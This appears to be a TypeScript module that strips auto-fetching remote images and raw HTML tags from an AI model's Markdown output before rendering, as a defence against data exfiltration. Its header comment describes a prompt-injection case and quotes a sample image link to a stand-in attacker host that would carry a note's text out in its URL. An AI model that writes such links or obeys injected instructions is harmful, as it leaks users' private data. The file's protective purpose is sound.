/**
 * Model output without the parts that fetch from the network on their own (#137, security review 2026-09-30).
 *
 * The chat renders the model's answers as Markdown, and a rendered image is fetched as soon as it exists. An
 * injected note could have the model write `![](https://attacker.example/x.png?d=<the note's text>)`, and the note
 * would leave the machine without any tool running. So before rendering, an image from the web becomes a link the
 * user can open (nothing is fetched without that click), and raw HTML tags are shown as text — `<img>`, `<video>`,
 * `<iframe>` and the like load by themselves. Images from the vault (`![[…]]`, relative paths) stay; code blocks
 * and inline code are left exactly as written.
 */

/** Whether *url* points at the network: a scheme other than the vault's own (`app:`) and inline `data:`. */
export function isRemote(url: string): boolean {
  const trimmed = url.trim().replace(/^<|>$/g, "").trim();
  if (trimmed.startsWith("//")) return true;
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(trimmed)?.[1]?.toLowerCase();
  return scheme !== undefined && scheme !== "app" && scheme !== "data" && !/^[a-z]$/i.test(scheme);
}

/** The label a blocked image gets: its alt text, or the host it would have come from. */
function label(alt: string, url: string): string {
  const shown = alt.trim() || (/^(?:[a-z][a-z0-9+.-]*:)?\/\/([^/?#\s>]+)/i.exec(url.trim().replace(/^</, ""))?.[1] ?? "remote");
  return `image: ${shown.replace(/[[\]]/g, "")} (not loaded)`;
}

const INLINE_IMAGE = /!\[([^\]\n]*)\]\(\s*(<[^>\n]*>|[^)\s]+)((?:\s+(?:"[^"\n]*"|'[^'\n]*'|\([^)\n]*\)))?\s*)\)/g;
const REFERENCE_IMAGE = /!\[([^\]\n]*)\](?:\[([^\]\n]*)\])?(?![([])/g;
const DEFINITION = /^ {0,3}\[([^\]\n]+)\]:\s*(<[^>\n]*>|\S+)/gm;
// A tag's start: `<name` followed by a space, `/` or `>` — not an autolink such as <https://…> or <a@b.c>
const HTML_TAG = /<(?=\/?[a-z][a-z0-9-]*[\s/>])/gi;

/** *text* with *transform* applied outside fenced code blocks and inline code. */
function outsideCode(text: string, transform: (prose: string) => string): string {
  const out: string[] = [];
  let prose: string[] = [];
  let fence: string | null = null;
  const flush = (): void => {
    if (!prose.length) return;
    // Inline code spans: a run of backticks, and the same run closing it
    out.push(prose.join("\n").split(/(`+[\s\S]*?`+)/).map((part, index) => (index % 2 ? part : transform(part))).join(""));
    prose = [];
  };
  for (const line of text.split("\n")) {
    const marker = /^ {0,3}(`{3,}|~{3,})/.exec(line)?.[1];
    if (fence) {
      out.push(line);
      if (marker && marker[0] === fence[0] && marker.length >= fence.length) fence = null;
    } else if (marker) {
      flush();
      out.push(line);
      fence = marker;
    } else {
      prose.push(line);
    }
  }
  flush();
  return out.join("\n");
}

/** *markdown* with images from the web turned into links and raw HTML tags shown as text. */
export function withoutRemoteMedia(markdown: string): string {
  const definitions = new Map<string, string>();
  for (const match of markdown.matchAll(DEFINITION)) definitions.set(match[1].trim().toLowerCase(), match[2]);
  return outsideCode(markdown, (prose) => prose
    .replace(INLINE_IMAGE, (whole, alt: string, url: string, title: string) =>
      (isRemote(url) ? `[${label(alt, url)}](${url}${title})` : whole))
    .replace(REFERENCE_IMAGE, (whole, alt: string, ref: string | undefined) => {
      const target = definitions.get((ref || alt).trim().toLowerCase());
      return target && isRemote(target) ? whole.slice(1).replace(`[${alt}]`, `[${label(alt, target)}]`) : whole;
    })
    .replace(HTML_TAG, "&lt;"));
}
